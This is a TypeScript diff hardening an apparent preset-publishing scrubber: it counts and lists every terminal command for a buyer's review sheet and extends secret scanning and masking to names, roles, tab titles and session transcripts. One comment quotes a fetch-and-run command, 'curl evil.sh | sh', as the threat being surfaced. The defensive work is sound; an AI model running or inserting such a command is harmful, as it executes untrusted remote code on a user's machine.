@@ -71,19 +71,32 @@ const SECRET_PATTERNS: { kind: string; re: RegExp }[] = [
  * installer must count with the same function or the check proves nothing.
  */
 export function countSurfaces(nodes: readonly CanvasNode[]): {
-  shells: number
+  commands: number
   notes: number
   urls: number
 } {
-  let shells = 0
+  let commands = 0
   let notes = 0
   let urls = 0
   for (const node of nodes) {
     if (node.kind === 'note') notes += 1
     else if (node.kind === 'browser') urls += 1
-    else if (node.preset === 'Shell') shells += 1
+    // H1: EVERY terminal that carries a command, not just preset==='Shell'.
+    // The paste engine writes `command` verbatim into a PTY regardless of
+    // preset, so five Claude Code nodes each holding `curl evil.sh | sh` were
+    // signing commands:0 and rendering an empty list on the review sheet — the
+    // buyer's only look at what is about to run.
+    else if (node.command.trim().length > 0) commands += 1
   }
-  return { shells, notes, urls }
+  return { commands, notes, urls }
+}
+
+/** Every terminal command in canvas order — what the review sheet lists. */
+export function commandsOf(nodes: readonly CanvasNode[]): string[] {
+  return nodes
+    .filter((n): n is Extract<CanvasNode, { kind: 'terminal' }> => n.kind === 'terminal')
+    .map((n) => n.command)
+    .filter((c) => c.trim().length > 0)
 }
 
 function scanSecrets(where: string, text: string | undefined, into: SecretFinding[]): void {
@@ -128,18 +141,33 @@ export function scrubForPublish(snapshot: TeamSnapshot, options: ScrubOptions = 
   const findings: SecretFinding[] = []
 
   const nodes: CanvasNode[] = snapshot.nodes.map((node) => {
+    // M8: a card's NAME is author-written text like any other field, and a
+    // secret pasted into one leaks exactly as far.
+    scanSecrets(`nodes[${node.id}].name`, node.name, findings)
     if (node.kind === 'note') {
       scanSecrets(`nodes[${node.id}].content`, node.content, findings)
-      return { ...node, content: mask(node.content) }
+      scanSecrets(`nodes[${node.id}].customName`, node.customName ?? undefined, findings)
+      return {
+        ...node,
+        name: mask(node.name),
+        content: mask(node.content),
+        ...(node.customName !== null ? { customName: mask(node.customName) } : {})
+      }
     }
     if (node.kind === 'browser') {
       scanSecrets(`nodes[${node.id}].url`, node.url, findings)
       const tabs = node.tabs?.map((tab) => {
         scanSecrets(`nodes[${node.id}].tabs.url`, tab.url, findings)
-        return { ...tab, url: mask(tab.url) }
+        scanSecrets(`nodes[${node.id}].tabs.title`, tab.title, findings)
+        return {
+          ...tab,
+          url: mask(tab.url),
+          ...(typeof tab.title === 'string' ? { title: mask(tab.title) } : {})
+        }
       })
-      return { ...node, url: mask(node.url), ...(tabs ? { tabs } : {}) }
+      return { ...node, name: mask(node.name), url: mask(node.url), ...(tabs ? { tabs } : {}) }
     }
+    scanSecrets(`nodes[${node.id}].role`, node.role ?? undefined, findings)
     // Terminal. Its command is the product — kept verbatim apart from path
     // masking and the resume flags, which would point a buyer's copy at the
     // AUTHOR's live session file.
@@ -149,6 +177,8 @@ export function scrubForPublish(snapshot: TeamSnapshot, options: ScrubOptions = 
       : stripSessionFlags(node.command)
     return {
       ...node,
+      name: mask(node.name),
+      ...(node.role !== null ? { role: mask(node.role) } : {}),
       command: mask(stripped),
       cwd: table.get(node.cwd) ?? node.cwd,
       // No session binding leaves the machine: an inherited id would make the
@@ -165,6 +195,36 @@ export function scrubForPublish(snapshot: TeamSnapshot, options: ScrubOptions = 
       forkOf: null
     }
   })
+
+  // C2: THE TRANSCRIPT IS SCANNED TOO. The scan used to walk only the cards, so
+  // a key pasted into a conversation shipped under a SIGNED secretScan:'clean'
+  // — the worst possible outcome, because the signature is what a buyer trusts
+  // instead of looking.
+  //
+  // Scanned even when includeSessions is false. The report travels signed
+  // either way, and "clean" asserted over a transcript nobody scanned is a
+  // false statement about the preset, not merely about its payload. It is also
+  // the publisher's own safety net: they learn the key is in there.
+  const maskedTurns: Record<string, unknown[]> = {}
+  for (const [terminalId, records] of Object.entries(snapshot.turns ?? {})) {
+    maskedTurns[terminalId] = (records as unknown[]).map((record, i) => {
+      const where = `turns[${terminalId}][${i}]`
+      const walk = (value: unknown): unknown => {
+        if (typeof value === 'string') {
+          scanSecrets(where, value, findings)
+          return mask(value)
+        }
+        if (Array.isArray(value)) return value.map(walk)
+        if (value !== null && typeof value === 'object') {
+          const out: Record<string, unknown> = {}
+          for (const [k, v] of Object.entries(value as Record<string, unknown>)) out[k] = walk(v)
+          return out
+        }
+        return value
+      }
+      return walk(record)
+    })
+  }
 
   // Counted with the SAME function the installer recounts with, so the
   // reconciliation it performs against this signed report actually proves
@@ -186,7 +246,7 @@ export function scrubForPublish(snapshot: TeamSnapshot, options: ScrubOptions = 
     dir: table.get(snapshot.dir) ?? snapshot.dir,
     ...(snapshot.dirs ? { dirs: snapshot.dirs.map((d) => table.get(d) ?? d) } : {}),
     nodes,
-    turns: includeSessions ? snapshot.turns : {},
+    turns: includeSessions ? (maskedTurns as TeamSnapshot['turns']) : {},
     ...(includeSessions && snapshot.sessions ? { sessions: snapshot.sessions } : {})
   }
   if (!includeSessions) delete (scrubbed as { sessions?: unknown }).sessions
